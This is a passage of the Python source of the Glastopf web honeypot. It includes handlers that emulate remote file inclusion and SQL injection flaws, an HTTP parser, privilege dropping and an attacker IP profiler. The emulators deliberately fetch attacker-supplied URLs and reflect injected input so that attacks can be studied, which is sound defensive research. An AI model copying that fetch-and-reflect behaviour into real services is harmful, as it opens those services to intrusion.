    def extract_url(self, url):
        protocol_pattern = re.compile("=.*(http(s)?|ftp(s)?)", re.IGNORECASE)
        matched_protocol = protocol_pattern.search(url).group(1)
        # FIXME: Check if the extracted url is actually a url
        injected_url = matched_protocol + url.partition(matched_protocol)[2].split("?")[0]
        return injected_url.strip("=")

    def get_filename(self, injected_file):
        file_name = hashlib.md5(injected_file).hexdigest()
        return file_name

    def store_file(self, injected_file):
        file_name = self.get_filename(injected_file)
        if not os.path.exists(os.path.join(self.files_dir, file_name)):
            with open(os.path.join(self.files_dir, file_name), 'w+') as local_file:
                local_file.write(injected_file)
        return file_name

    def download_file(self, url):
        injectd_url = self.extract_url(urllib2.unquote(url))
        try:
            req = urllib2.Request(injectd_url)
            # FIXME: We need a timeout on read here
            injected_file = urllib2.urlopen(req, timeout=4).read()
        except IOError as e:
            logger.exception("Failed to fetch injected file, I/O error: {0}".format(e))
            # TODO: We want to handle the case where we can't download
            # the injected file but pretend to be vulnerable.
            file_name = None
        except urllib2.URLError as e:
            logger.exception("Failed to fetch injected file, URLError error: {0}".format(e))
            file_name = None
        else:
            file_name = self.store_file(injected_file)
        return file_name

    def handle(self, attack_event):
        if attack_event.http_request.command == 'GET':
            attack_event.file_name = self.download_file(
                attack_event.http_request.path)
        elif attack_event.http_request.command == 'POST':
            pass
        else:
            logger.error("Unsupported method: {0}".format(attack_event.http_request.command))
        if attack_event.file_name:
            response = sandbox.run(attack_event.file_name, self.data_dir)
            attack_event.http_request.set_raw_response(response)
        return attack_event

########NEW FILE########
__FILENAME__ = robots
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from glastopf.modules.handlers import base_emulator
import os


class RobotsHandler(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(RobotsHandler, self).__init__(data_dir)

    def handle(self, attack_event):
        robots_path = os.path.join(self.data_dir, 'robots/robots.txt')
        with open(robots_path, 'r') as robot_file:
            response = robot_file.read()
            attack_event.http_request.set_raw_response(response)
        return attack_event

########NEW FILE########
__FILENAME__ = sqli
# Copyright (C) 2013  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import re
from textwrap import dedent

import glastopf.modules.classification.sql as sql
import glastopf.modules.classification.sql_utils.responses as sql_responses
from glastopf.modules.handlers import base_emulator


class SQLiEmulator(base_emulator.BaseEmulator):
    """Emulates a SQL injection vulnerability and a successful attack."""

    def __init__(self, data_dir):
        self.sqli_c = sql.SQLiClassifier()
        self.sql_response = sql_responses.SQLResponses()
        super(SQLiEmulator, self).__init__(data_dir)

    def handle(self, attack_event):
        payload = ""
        value = ""
        for value_list in attack_event.http_request.request_query.values():
            value = value_list[0]
            self.ret = self.sqli_c.classify(value)
            if len(self.ret["fingerprint"]) > 0:
                best_query, best_ratio = self.sqli_c.query_similarity(self.ret["fingerprint"], value.lower())
                payload = self.sqli_c.token_map[best_query]
        if payload and payload["resp"]:
            attack_event.http_request.set_raw_response(payload["resp"])
        else:
            response = self.sql_response.get_response("mysql_error").content
            payload_response = re.sub("PAYLOAD", value, response)
            attack_event.http_request.set_raw_response(dedent(payload_response))

########NEW FILE########
__FILENAME__ = style_css
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os
from glastopf.modules.handlers import base_emulator
from glastopf.modules.handlers.base_emulator import package_directory


class StyleHandler(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(StyleHandler, self).__init__(data_dir)

    def handle(self, attack_event):
        css_file = os.path.join(self.data_dir, 'style/style.css')
        with open(css_file, 'r') as style_file:
            #attack_event.response = style_file.read()
            attack_event.http_request.set_response(style_file.read(),  headers=(('Content-type', 'text/css'),))
        return attack_event

########NEW FILE########
__FILENAME__ = create_surface
# Copyright (C) 2012  Lukas Rist <glaslos@gmail.com>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os

from glastopf.modules.handlers import base_emulator

from jinja2 import Environment, FileSystemLoader


class SurfaceCreator(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(SurfaceCreator, self).__init__(data_dir)
        self.template_env = Environment(loader=FileSystemLoader(os.path.join(self.data_dir, "templates")))

    def get_index(self, title="Title Title", target="/index", body="Some Body", footer="Footer Text"):
        template = self.template_env.get_template('index.html')
        surface_page = template.render(title=title, target=target, body=body, footer=footer)
        return surface_page


if __name__ == "__main__":
    sc = SurfaceCreator()
    sc.get_index()
########NEW FILE########
__FILENAME__ = tomcat_manager
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from glastopf.modules.handlers import base_emulator
import os


class TomcatManagerHandler(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(TomcatManagerHandler, self).__init__(data_dir)

    def handle(self, attack_event):
        tomcat_manager_path = os.path.join(self.data_dir, 'tomcat/manager.html')
        with open(tomcat_manager_path, 'r') as tomcat_manager_file:
            attack_event.http_request.set_response(tomcat_manager_file.read())
        return attack_event

########NEW FILE########
__FILENAME__ = tomcat_status
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from glastopf.modules.handlers import base_emulator
import os


class TomcatManagerStatusHandler(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(TomcatManagerStatusHandler, self).__init__(data_dir)

    def handle(self, attack_event):
        tomcat_manager_path = os.path.join(self.data_dir, 'tomcat/manager_status.html')
        with open(tomcat_manager_path, 'r') as tomcat_manager_file:
            attack_event.http_request.set_response(tomcat_manager_file.read())
        return attack_event

########NEW FILE########
__FILENAME__ = trace
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from glastopf.modules.handlers import base_emulator


class TraceHandler(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(TraceHandler, self).__init__(data_dir)

    def handle(self, attack_event):
        attack_event.response += attack_event.raw_request
        return attack_event

########NEW FILE########
__FILENAME__ = unknown
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os
from random import choice
import codecs
import sys
from string import Template

from glastopf.modules.handlers import base_emulator


if sys.getdefaultencoding() != 'utf-8':
    reload(sys)
    sys.setdefaultencoding('utf-8')


class DorkList(base_emulator.BaseEmulator):
    def __init__(self, data_dir):
        super(DorkList, self).__init__(data_dir)

    def _get_template(self, attack_event):
        # TODO: decode the file using chardet or even better create
        # them with utf-8 encoding
        pages_path = os.path.join(self.data_dir, 'dork_pages')
        dork_page_list = os.listdir(pages_path)
        self.dork_page = os.path.join(pages_path, choice(dork_page_list))
        ip_address = attack_event.source_addr[0]
        with codecs.open(self.dork_page, "rb", "utf-8") as dork_page:
            comments_file = os.path.join(self.data_dir, 'comments.txt')
            if os.path.isfile(comments_file):
                with codecs.open(comments_file, "r", "utf-8") as comments_txt:
                    general_comments = comments_txt.read()
                    #ip_comments = profiler.Profiler.get_comments(ip_address)
                    #display_comments = str(ip_comments) + str(general_comments)
                    display_comments = '' + str(general_comments)
            else:
                display_comments = ''
            template = Template(dork_page.read())
        return template, display_comments

    def handle(self, attack_event):
        template, display_comments = self._get_template(attack_event)
        self.template = template.safe_substitute(login_msg="",
                                                 comments=display_comments)
        attack_event.http_request.set_response(self.template)
        #attack_event.response += self.template
        return attack_event

########NEW FILE########
__FILENAME__ = request_handler
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import logging

from glastopf.modules.handlers.base_emulator import BaseEmulator
import os


logger = logging.getLogger(__name__)


class RequestHandler:
    def __init__(self, data_dir):
        self.data_dir = data_dir

    def get_handler(self, name):
        try:
            BaseEmulator(self.data_dir)
            module_name = "glastopf.modules.handlers.emulators." + name
            __import__(module_name, globals(), locals(), [], -1)
            emulators = BaseEmulator.__subclasses__()
        except ImportError as e:
            logging.exception("Error while importing emulator: {0}: {1}".format(name, e))
            return self.get_handler("unknown")
        else:
            for emulator in emulators:
                if emulator.__module__.rsplit(".", 1)[1].strip() == name:
                    return emulator(data_dir=self.data_dir)
            return self.get_handler("unknown")

########NEW FILE########
__FILENAME__ = handler
# Copyright (C) 2013 Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import urlparse
from StringIO import StringIO
from BaseHTTPServer import BaseHTTPRequestHandler
import logging

logger = logging.getLogger(__name__)


class HTTPHandler(BaseHTTPRequestHandler):
    def __init__(self, request_string, client_address, server_version=None, sys_version=None):

        """
        Encapsulates http request parsing and facilitates generation of proper (and improper) http response.

        :param request_string: raw HTTP request to be parsed.
        :param client_address: tuple containing clients ip and source port.
        :param server_version: set server version to be used in response header (Optional).
        :param sys_version: set sys version to be used in response header (Optional).
        """
        #Parent class expects fileobjects
        self.rfile = StringIO(request_string)
        self.wfile = StringIO()
        self.rfile.seek(0)

        self.client_address = client_address

        #parse the request
        self.handle_one_request()

        #If not defined default values will be provided by parent.
        if server_version:
            self.server_version = server_version
        if sys_version:
            self.sys_version = sys_version

        #The following instance variables ensures consistent naming.
        url = urlparse.urlparse(self.path)
        #path +  parameters + query strign + fragment (ex: /mad.php;woot?a=c#beer.
        self.request_url = self.path
        #the entire http request
        self.request_raw = request_string
        #parsed query dictionary. See http://docs.python.org/2/library/urlparse.html for the format.
        self.request_query = urlparse.parse_qs(url.query, True)
        #parameters (no, this it NOT the query string!)
        self.request_params = url.params
        #the clean path. (ex: /info.php)
        self.request_path = url.path
        #GET, POST, DELETE, TRACE, etc.
        self.request_verb = self.command
        if hasattr(self, 'headers'):
            self.request_headers = self.headers
        else:
            self.request_headers = BaseHTTPRequestHandler.MessageClass

    def handle_one_request(self):
        """
        Handles and parses the request.
        """
        self.requestline = ''
        self.request_version = ''
        self.path = ''
        self.command = ''
        self.query = ''

        self.raw_requestline = self.rfile.readline(65537)
        if len(self.raw_requestline) > 65536:
            self.send_error(414)
            return
        if not self.raw_requestline:
            self.close_connection = 1
            return
        #parse_request(duh), parsing errors will result in a proper http response(self.get_get_response())
        if not self.parse_request():
            # An error code has been sent, just exit
            return
        #In the original implementation this method would had called the 'do_' + self.command method
        if not self.command in ('PUT', 'GET', 'POST', 'HEAD', 'TRACE'):
            self.send_error(501, "Unsupported method (%r)" % self.command)
            return

        #at this point we have parsed the headers which means that
        #the rest of the request is the body
        self.request_body = self.rfile.read()

    def set_response(self, body, http_code=200, headers=(('Content-type', 'text/html'),)):
        """
        Sets body, response code and headers. Mapping between http_code and error text is handled
        by the parent class.

        :param body: the response body.
        :param http_code: http code to be used in response (default=200).
        :param headers: tuple of (header, value) pairs for the response header (default= (('Content-type', 'text/html'),))
        """
        self.send_response(http_code)
        for header in headers:
            self.send_header(header[0], header[1])
        self.end_headers()
        self.wfile.write(body)

    def set_raw_response(self, content):
        """
        Provides a convenient way to fully control the entire http response. This comes handy when writing attack modules
        which often breaks protocol standards.
        """
        self.wfile = StringIO(content)

    def send_error(self, code, message=None):
        """
        Generates a proper http error response. This method is guaranteed to raise a HTTPError exception after the
        response has been generated.

        :param code: http error code to return.
        :param message: error message in plain text, if not provided a text match will be lookup using the error code. (Optional).
        :raise: HTTPError
        """
        BaseHTTPRequestHandler.send_error(self, code, message)
        #raise error so that we can make sure this request is not passed to attack handlers
        raise HTTPError(self.get_response())

    def get_response(self):
        """
        Returns the entire http response.
        """
        return self.wfile.getvalue()

    def get_response_header(self):
        """
        Returns the http response header.
        """
        if "\r\n\r\n" in self.wfile.getvalue():
            return self.wfile.getvalue().split('\r\n\r\n', 1)[0]
        else:
            return self.wfile.getvalue()

    def get_response_body(self):
        """
        Returns the http response body.
        """
        if '\r\n\r\n' in self.wfile.getvalue():
            return self.wfile.getvalue().split('\r\n\r\n', 1)[1]
        else:
            return self.wfile.getvalue()

    def log_message(self, format, *args):
        pass

    def version_string(self):
        """
        Return the server software version string.
        This will be included in the http response
        """
        return self.server_version + ' ' + self.sys_version


class HTTPError(Exception):
    def __init__(self, error_text):
        self.error_text = error_text
########NEW FILE########
__FILENAME__ = method_handler
# Copyright (C) 2011  Lukas Rist
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import glastopf.modules.classification.request as request_classifier


class HTTPMethods(object):
    # TODO: Add more method handler

    def __init__(self, data_dir):
        self.data_dir = data_dir
        pass

    def GET(self, http_request):
        RequestClassifier = request_classifier.Classifier(self.data_dir)
        matched_pattern = RequestClassifier.classify_request(http_request)
        return matched_pattern

    def POST(self, http_request):
        RequestClassifier = request_classifier.Classifier(self.data_dir)
        matched_pattern = RequestClassifier.classify_request(http_request)
        #http_request.request_body -> File('files/payloads')
        return matched_pattern

    def HEAD(self, http_request):
        # TODO: Return the proper HEAD respone
        return "head"

    def TRACE(self, http_request):
        return "trace"

    def OPTIONS(self, http_request):
        # TODO: Return the proper OPTIONS respone
        return "options"

########NEW FILE########
__FILENAME__ = logging_handler
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os
import logging

from glastopf.modules.reporting.auxiliary.base_logger import BaseLogger

logger = logging.getLogger(__name__)
package_directory = os.path.dirname(os.path.abspath(__file__))


def _get_logger_names(path=os.path.join(package_directory, 'reporting/auxiliary')):
    names = os.listdir(path)
    for name in reversed(names):
        if (name == 'base_logger.py' or name == '.pyc'
            or name == '__init__.py'):
            names.remove(name)
    return names


def get_aux_loggers(data_dir, create_tables=True):
    loggers = []
    try:
        BaseLogger()
        for name in _get_logger_names():
            module_name = "glastopf.modules.reporting.auxiliary." + name.split('.', 1)[0]
            __import__(module_name, globals(), locals(), [], -1)
        logger_classes = BaseLogger.__subclasses__()
    except ImportError as e:
        logger.exception("Error while importing logger: {0}".format(e))
        return None
    else:
        for logger_class in logger_classes:
            logger_instance = logger_class(data_dir)
            if logger_instance.options['enabled']:
                loggers.append(logger_instance)
        return loggers

########NEW FILE########
__FILENAME__ = privileges
import os
import pwd
import grp
import logging
import platform

logger = logging.getLogger(__name__)


def recursive_chown(path, run_uid, run_gid):
    for root, dirs, files in os.walk(path):
        for single_dir in dirs:
            os.chown(os.path.join(root, single_dir), run_uid, run_gid)
        for single_file in files:
            os.chown(os.path.join(root, single_file), run_uid, run_gid)


def drop(work_dir, new_uid='nobody', new_gid='nogroup'):
    starting_uid = os.getuid()
    starting_gid = os.getgid()

    if os.getuid() != 0:
        return
    if starting_uid == 0:

        #special handling for os x < 10.9. (getgrname has trouble with gid below 0)
        if platform.mac_ver()[0] and platform.mac_ver()[0] < float('10.9'):
            wanted_gid = -2
        else:
            wanted_gid = grp.getgrnam(new_gid)[2]

        run_uid = pwd.getpwnam(new_uid)[2]
        run_gid = wanted_gid
        try:
            recursive_chown(work_dir, run_uid, run_gid)
        except OSError as e:
            logger.exception("Could not change file owner: {0}".format(e))
        try:
            os.setgid(run_gid)
        except OSError as e:
            logger.exception("Could not set new group: {0}".format(e))

        try:
            os.setuid(run_uid)
        except OSError as e:
            logger.exception("Could not set net user: {0}".format(e))

        new_umask = 066
        try:
            os.umask(new_umask)
        except Exception as e:
            logger.error("Failed to change umask: {0}".format(e))


########NEW FILE########
__FILENAME__ = ip_profile
from sqlalchemy import Column, String, Integer, Float
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()
class IPProfile(Base):
    __tablename__ = 'ip_profiles'
    
    ip = Column(String, primary_key=True)
    as_number = Column(String)
    as_name = Column(String)
    country_code = Column(String)
    total_requests = Column(Integer)
    total_scans = Column(Integer)
    bgp_prefix = Column(String)
    requests_per_scan = Column(Float)
    avg_scan_duration = Column(Float)
    scan_time_period = Column(Float)
    last_event_time = Column(String) 
       
    def __init__(
            self, ip=None, as_number=None, as_name=None,
            country_code=None, total_requests=0,
            total_scans=0, bgp_prefix=None,
            requests_per_scan=None, avg_scan_duration=1, 
            scan_time_period=1, last_event_time=None):
        self.ip = ip
        self.as_number = as_number
        self.as_name = as_name
        self.country_code = country_code
        self.total_requests = total_requests
        self.total_scans = total_scans
        self.bgp_prefix = bgp_prefix
        self.requests_per_scan = requests_per_scan
        self.avg_scan_duration = avg_scan_duration
        self.scan_time_period = scan_time_period
        self.last_event_time = last_event_time

########NEW FILE########
__FILENAME__ = profiler
import collections
import thread
import time
import subprocess
from datetime import datetime, timedelta
import re

from glastopf.modules.processing.scans_table import ScansTable
from glastopf.modules.processing.scan import Scan
import glastopf.modules.processing.ip_profile as ipp


class Profiler(object):
    def __init__(self, maindb):
        self.maindb = maindb
        self.scans_table = ScansTable()
        self.events_deque = collections.deque()
        # Max interval(sec) between two requests that are part of the same scan
        self.scan_threshold = 30
        # The database will be updated this frequently
        self.profile_update_time = datetime.now() + timedelta(minutes=2)
        self.deque_read_interval = 15
        self.cymru_min_timeout = 2
        self.cymru_timeout = 3
        #self.loggers = logging_handler.get_loggers()
        thread.start_new_thread(self.run, ())

    # Reverse the IP address for querying origin.asn.cymru.com
    def reverse_ip(self, ip):
        ipreg = re.compile("([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})"
                                    "\.([0-9]{1,3})$")
        m = ipreg.match(ip)
        if m is not None:
            return (m.group(4) + "." + m.group(3) + "." + m.group(2) +
                    "." + m.group(1))
        else:
            return ""

    def handle_event(self, event):
        self.events_deque.appendleft(event)

    @staticmethod
    def add_comment(ip_address, comment):
        #=======================================================================
        # loggers = logging_handler.get_loggers(create_tables=False)
        # supported_loggers = []
        # for logger in loggers:
        #    if logger.__class__.__name__ in ('Database',):
        #        supported_loggers.append(logger)
        # for logger in supported_loggers:
        #    logger.add_comment(ip_address, comment)
        #=======================================================================
        pass

    @staticmethod
    def get_comments(ip_address):
        #loggers = logging_handler.get_loggers(create_tables=False)
        #supported_loggers = []
        #for logger in loggers:
        #    if logger.__class__.__name__ in ('LogPostgreSQL',):
        #        supported_loggers.append(logger)
        #if len(supported_loggers) > 0:
        #    return supported_loggers[0].get_comments(ip_address)
        #else:
        #    return ''
        return ''

    def update_scan(self, event):
        source_ip = event.source_addr[0].split(',')[0]
        if source_ip is None:
            return
        scan = self.scans_table.get_current_scan(source_ip)
        event_time = datetime.strptime(event.event_time, "%Y-%m-%d %H:%M:%S")
        if scan is None:
            scan = Scan(source_ip, start_time=event_time)
            self.scans_table.insert_scan(scan)
            return

        time_diff = (scan.last_event_time - event_time).total_seconds()
        if time_diff > self.scan_threshold:
            self.scans_table.close_scan(source_ip)
            scan = Scan(source_ip, start_time=event_time)
            self.scans_table.insert_scan(scan)
        else:
            scan.requests += 1
            scan.last_event_time = event_time

    def fetch_as_number(self, ip_profile):
        cmd = subprocess.Popen(
                    ['dig', '+short', self.reverse_ip(ip_profile.ip) +
                    '.origin.asn.cymru.com', 'TXT'], stdout=subprocess.PIPE)
        time.sleep(self.cymru_min_timeout)
        if cmd.poll() is None:
            time.sleep(self.cymru_timeout)
            if cmd.poll() is None:
                try:
                    cmd.kill()
                except:
                    pass
                else:
                    return False
        as_info = cmd.stdout.readline()
        as_info = as_info.strip().strip('"').split('|')
        try:
            # .split()[0] is added to deal with multiple ASNs
            as_info = [word.strip().split()[0] for word in as_info]
            ip_profile.as_number = as_info[0]
            ip_profile.bgp_prefix = as_info[1]
            ip_profile.country_code = as_info[2]
        except IndexError:
            return False
        else:
            return True

    def fetch_as_name(self, ip_profile):
        cmd = subprocess.Popen(
                    ['dig', '+short', ('AS' + ip_profile.as_number +
                     '.asn.cymru.com'), 'TXT'], stdout=subprocess.PIPE)
        as_info = cmd.stdout.readline()
        time.sleep(self.cymru_min_timeout)
        if cmd.poll() is None:
            time.sleep(self.cymru_timeout)
            if cmd.poll() is None:
                try:
                    cmd.kill()
                except:
                    pass
                else:
                    return
#        as_name_info = cmd.stdout.readline()
        as_name_info = as_info.strip().strip('"').split('|')
        try:
            ip_profile.as_name = as_name_info[4].strip()
        except IndexError:
            pass

    def create_new_profile(self, source_ip):
        ip_profile = ipp.IPProfile(ip=source_ip)
        if self.fetch_as_number(ip_profile):
            self.fetch_as_name(ip_profile)
        return ip_profile

    def update_profile_with_scan(self, profile, scan):
        profile.total_requests += scan.requests
        profile.total_scans += 1
        profile.requests_per_scan = (profile.total_requests * 1.0 /
                                     profile.total_scans)
        profile.avg_scan_duration = (
                ((profile.avg_scan_duration * (profile.total_scans - 1)) +
                 (scan.last_event_time - scan.start_time).total_seconds()) /
                (profile.total_scans))
        if profile.total_scans > 1:
            prof_last_ev_time = datetime.strptime(profile.last_event_time,
                                              "%Y-%m-%d %H:%M:%S")
            profile.scan_time_period = (
                ((profile.scan_time_period * (profile.total_scans - 2)) +
                (scan.start_time - prof_last_ev_time).total_seconds()) /
                (profile.total_scans - 1))
        profile.last_event_time = scan.last_event_time.strftime("%Y-%m-%d %H:%M:%S")

    def update_profile_with_current_scan(self, profile, scan):
        profile.total_requests += (scan.requests - scan.requests_posted)
        scan.requests_posted = scan.requests

    def update_profiles(self):
        self.scans_table.close_old_scans(self.scan_threshold)
        for source_ip in self.scans_table.scans:
            ip_profile = self.maindb.get_profile(source_ip)
            if ip_profile is None:
                ip_profile = self.create_new_profile(source_ip)
                self.maindb.insert_profile(ip_profile)
            for scan in self.scans_table.scans[source_ip]['closed']:
                self.update_profile_with_scan(ip_profile, scan)
            if 'current' in self.scans_table.scans[source_ip]:
                scan = self.scans_table.scans[source_ip]['current']
                self.update_profile_with_current_scan(ip_profile, scan)
            self.maindb.update_db()
        self.scans_table.delete_closed_scans()

    def run(self):
        while True:
            if len(self.events_deque) == 0:
                if datetime.now() > self.profile_update_time:
                    self.update_profiles()
                    #self.profile_update_time += timedelta(hours=24)
                    self.profile_update_time += timedelta(seconds=30)
                time.sleep(self.deque_read_interval)
                continue
            self.update_scan(self.events_deque.pop())

########NEW FILE########
__FILENAME__ = scan
class Scan(object):
    def __init__(self, source_ip, start_time):
        self.source_ip = source_ip
        self.start_time = start_time
        self.last_event_time = start_time
        self.requests = 1
        self.requests_posted = 0
        self.current = True

########NEW FILE########
__FILENAME__ = scans_table
from datetime import datetime


class ScansTable():
    def __init__(self):
        self.scans = {}

    def insert_scan(self, scan):
        if scan.source_ip not in self.scans:
            self.scans[scan.source_ip] = {}
            self.scans[scan.source_ip]['closed'] = []
        self.scans[scan.source_ip]['current'] = scan

    def get_current_scan(self, source_ip):
        if source_ip in self.scans:
            if 'current' in self.scans[source_ip]:
                return self.scans[source_ip]['current']
        return None

    def close_scan(self, source_ip):
        if source_ip in self.scans:
            if 'current' in self.scans[source_ip]:
                current = self.scans[source_ip]['current']
                self.scans[source_ip]['current'].current = False
                self.scans[source_ip]['closed'].append(current)
                del self.scans[source_ip]['current']

    def close_old_scans(self, scan_threshold):
        time_now = datetime.now()
        for source_ip in self.scans:
            if 'current' in self.scans[source_ip]:
                scan = self.scans[source_ip]['current']
                time_diff = (time_now - scan.last_event_time).total_seconds()
                if time_diff > scan_threshold:
                    self.scans[source_ip]['current'].current = False
                    self.scans[source_ip]['closed'].append(scan)
                    del self.scans[source_ip]['current']

    def delete_closed_scans(self):
        for source_ip in self.scans:
            del self.scans[source_ip]['closed'][:]

########NEW FILE########
__FILENAME__ = base_logger
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from ConfigParser import ConfigParser


class BaseLogger(object):
    def __init__(self, config='glastopf.cfg'):
        if not isinstance(config, ConfigParser):
            self.config = ConfigParser()
            self.config.read(config)
        else:
            self.config = config

    def insert(self, event):
        pass

########NEW FILE########
__FILENAME__ = log_hpfeeds
# Copyright (C) 2013 Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
